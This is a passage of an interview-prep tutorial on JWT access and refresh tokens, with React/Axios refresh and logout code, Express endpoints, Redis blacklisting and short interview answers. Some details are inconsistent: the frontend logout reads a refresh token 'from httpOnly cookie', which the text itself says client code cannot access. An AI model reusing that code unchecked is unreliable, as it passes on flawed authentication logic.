**Why blacklist:**

* When user logs out, blacklist refresh token - invalidate token so it can't be used

* When refresh token rotated, blacklist old one - old token becomes invalid

* Prevents use of stolen/revoked tokens - can't use tokens that were logged out or rotated

**Implementation:**

* Store blacklisted tokens in Redis or database - keep list of invalid tokens

* Check blacklist before validating token - verify token isn't blacklisted

* Set expiry on blacklist entries (same as token expiry) - auto-cleanup when token would have expired

---

### 🔹 ⚛️ Frontend Implementation (React.js)

### 🔹 Token Refresh with Axios Interceptor

**Complete Implementation:**

```javascript
// Frontend: utils/axiosConfig.ts
import axios from 'axios';

let isRefreshing = false;
let failedQueue: Array<{
  resolve: (value?: any) => void;
  reject: (error?: any) => void;
}> = [];

const processQueue = (error: any, token: string | null = null) => {
  failedQueue.forEach(prom => {
    if (error) {
      prom.reject(error);
    } else {
      prom.resolve(token);
    }
  });

  failedQueue = [];
};

// Request interceptor - add access token to requests
axios.interceptors.request.use(
  (config) => {
    const token = getAccessToken(); // From memory or secure storage
    if (token) {
      config.headers.Authorization = `Bearer ${token}`;
    }
    return config;
  },
  (error) => Promise.reject(error)
);

// Response interceptor - handle token refresh
axios.interceptors.response.use(
  (response) => response,
  async (error) => {
    const originalRequest = error.config;

    // If 401 and not already retrying
    if (error.response?.status === 401 && !originalRequest._retry) {
      if (isRefreshing) {
        // If already refreshing, queue this request
        return new Promise((resolve, reject) => {
          failedQueue.push({ resolve, reject });
        })
          .then(token => {
            originalRequest.headers.Authorization = `Bearer ${token}`;
            return axios(originalRequest);
          })
          .catch(err => Promise.reject(err));
      }

      originalRequest._retry = true;
      isRefreshing = true;

      try {
        // Get refresh token from httpOnly cookie (sent automatically)
        const response = await axios.post('/api/auth/refresh', {}, {
          withCredentials: true // Send cookies
        });

        const { accessToken } = response.data;

        // Store new access token
        setAccessToken(accessToken);

        // Process queued requests
        processQueue(null, accessToken);

        // Update Authorization header and retry original request
        originalRequest.headers.Authorization = `Bearer ${accessToken}`;

        return axios(originalRequest);
      } catch (refreshError) {
        // Refresh failed, logout user
        processQueue(refreshError, null);
        logout();
        return Promise.reject(refreshError);
      } finally {
        isRefreshing = false;
      }
    }

    return Promise.reject(error);
  }
);

```

### 🔹 Logout Implementation

**Complete Logout Flow:**

```javascript
// Frontend: services/authService.ts
export const logout = async () => {
  try {
    const refreshToken = getRefreshToken(); // From httpOnly cookie

    // Call logout API to invalidate refresh token on server
    await axios.post(
      '/api/auth/logout',
      { refreshToken },
      { withCredentials: true }
    );
  } catch (error) {
    // Even if API call fails, clear tokens locally
    console.error('Logout error:', error);
  } finally {
    // Clear tokens from client
    clearAccessToken(); // Clear from memory
    // Refresh token cookie is cleared by server (httpOnly cookie)

    // Clear Redux state
    dispatch(logoutUser());

    // Redirect to login
    window.location.href = '/login';
  }
};

```

### 🔹 Token Storage Strategy

**Secure Token Storage:**

```javascript
// Frontend: utils/tokenStorage.ts

// Access Token - Store in memory (most secure)
let accessToken: string | null = null;

export const setAccessToken = (token: string) => {
  accessToken = token;
  // Optionally store in sessionStorage for page refresh
  // sessionStorage is cleared when tab closes
  sessionStorage.setItem('accessToken', token);
};

export const getAccessToken = (): string | null => {
  // Prefer memory, fallback to sessionStorage
  return accessToken || sessionStorage.getItem('accessToken');
};

export const clearAccessToken = () => {
  accessToken = null;
  sessionStorage.removeItem('accessToken');
};

// Refresh Token - Stored in httpOnly cookie (handled by server)
// Client cannot access it directly (XSS safe)
// Cookie is sent automatically with requests (withCredentials: true)

```

---

### 🔹 🟢 Backend Implementation (Node.js/Express.js)

### 🔹 Token Refresh Endpoint

**Complete Implementation:**

```javascript
// Backend: routes/auth.ts
router.post('/refresh', async (req, res) => {
  try {
    // Get refresh token from httpOnly cookie
    const refreshToken = req.cookies.refreshToken;

    if (!refreshToken) {
      return res.status(401).json({ error: 'Refresh token not provided' });
    }

    // Verify refresh token
    const decoded = jwt.verify(refreshToken, process.env.REFRESH_TOKEN_SECRET);

    // Check if refresh token is blacklisted
    const isBlacklisted = await redis.get(`blacklist:${refreshToken}`);
    if (isBlacklisted) {
      return res.status(401).json({ error: 'Token revoked' });
    }

    // Check if user still exists and is active
    const user = await User.findById(decoded.userId);
    if (!user || !user.isActive) {
      return res.status(401).json({ error: 'User not found' });
    }

    // Generate new access token
    const newAccessToken = jwt.sign(
      { userId: user.id, email: user.email },
      process.env.ACCESS_TOKEN_SECRET,
      { expiresIn: '15m' }
    );

    // Optionally rotate refresh token (security best practice)
    const newRefreshToken = jwt.sign(
      { userId: user.id },
      process.env.REFRESH_TOKEN_SECRET,
      { expiresIn: '7d' }
    );

    // Blacklist old refresh token (if using rotation)
    await redis.setex(`blacklist:${refreshToken}`, 7 * 24 * 60 * 60, '1');

    // Set new refresh token cookie
    res.cookie('refreshToken', newRefreshToken, {
      httpOnly: true,
      secure: process.env.NODE_ENV === 'production',
      sameSite: 'strict',
      maxAge: 7 * 24 * 60 * 60 * 1000 // 7 days
    });

    res.json({
      accessToken: newAccessToken,
      expiresIn: 900 // 15 minutes
    });
  } catch (error) {
    res.status(401).json({ error: 'Invalid refresh token' });
  }
});

```

### 🔹 Logout Endpoint

**Complete Implementation:**

```javascript
// Backend: routes/auth.ts
router.post('/logout', authenticate, async (req, res) => {
  try {
    const refreshToken = req.cookies.refreshToken || req.body.refreshToken;

    if (refreshToken) {
      // Blacklist refresh token
      const decoded = jwt.decode(refreshToken);
      if (decoded) {
        const expiresIn = decoded.exp - Math.floor(Date.now() / 1000);
        if (expiresIn > 0) {
          await redis.setex(`blacklist:${refreshToken}`, expiresIn, '1');
        }
      }
    }

    // Optionally blacklist current access token
    const accessToken = req.headers.authorization?.split(' ')[1];
    if (accessToken) {
      const decoded = jwt.decode(accessToken);
      if (decoded) {
        const expiresIn = decoded.exp - Math.floor(Date.now() / 1000);
        if (expiresIn > 0) {
          await redis.setex(`blacklist:${accessToken}`, expiresIn, '1');
        }
      }
    }

    // Clear refresh token cookie
    res.clearCookie('refreshToken', {
      httpOnly: true,
      secure: process.env.NODE_ENV === 'production',
      sameSite: 'strict'
    });

    res.json({ message: 'Logged out successfully' });
  } catch (error) {
    res.status(500).json({ error: 'Logout failed' });
  }
});

```

### 🔹 Authentication Middleware with Token Validation

**Complete Implementation:**

```javascript
// Backend: middleware/authenticate.ts
export const authenticate = async (req: Request, res: Response, next: NextFunction) => {
  try {
    // Get access token from Authorization header
    const authHeader = req.headers.authorization;
    if (!authHeader || !authHeader.startsWith('Bearer ')) {
      return res.status(401).json({ error: 'No token provided' });
    }

    const accessToken = authHeader.split(' ')[1];

    // Check if token is blacklisted
    const isBlacklisted = await redis.get(`blacklist:${accessToken}`);
    if (isBlacklisted) {
      return res.status(401).json({ error: 'Token revoked' });
    }

    // Verify token
    const decoded = jwt.verify(accessToken, process.env.ACCESS_TOKEN_SECRET) as JwtPayload;

    // Get user from database
    const user = await User.findById(decoded.userId);
    if (!user || !user.isActive) {
      return res.status(401).json({ error: 'User not found' });
    }

    // Attach user to request
    req.user = user;
    req.userId = user.id;

    next();
  } catch (error) {
    if (error.name === 'TokenExpiredError') {
      return res.status(401).json({ error: 'Token expired' });
    }
    return res.status(401).json({ error: 'Invalid token' });
  }
};

```

---

## ⭐ Summary — 10-second Interview Version

> "Access tokens are short-lived (15 min) and used for API requests. Refresh tokens are long-lived (days) and used to get new access tokens. When access token expires, client uses refresh token to get new one automatically. On logout, invalidate refresh token on server and clear tokens on client. Store refresh token in httpOnly cookie for security."

---

## ⭐ Extra Points (If Interviewer Asks More)

### What happens if refresh token is stolen?

Use token rotation - issue new refresh token on each refresh, blacklist old one. If stolen, old token becomes useless. Also use device fingerprinting to detect suspicious activity.

### Should access token be in cookie or localStorage?

httpOnly cookie is more secure (XSS safe) but vulnerable to CSRF. localStorage is convenient but XSS vulnerable. For access token, memory is most secure. For refresh token, httpOnly cookie is best.

### How do you handle concurrent refresh requests?

Use a flag to prevent multiple refresh calls. Queue requests while refreshing, then retry all with new token. Or use a promise that multiple requests can await.

### How do you handle token refresh on page refresh?

Store access token in sessionStorage (cleared on tab close). On page load, check if token exists. If expired, use refresh token to get new one. If refresh token expired, redirect to login.

### What's the difference between token blacklisting and token expiration?

Token expiration is automatic (JWT has expiry). Token blacklisting is manual (revoke token before expiry, e.g., on logout). Blacklisting requires storage (Redis) to check if token is revoked.

---

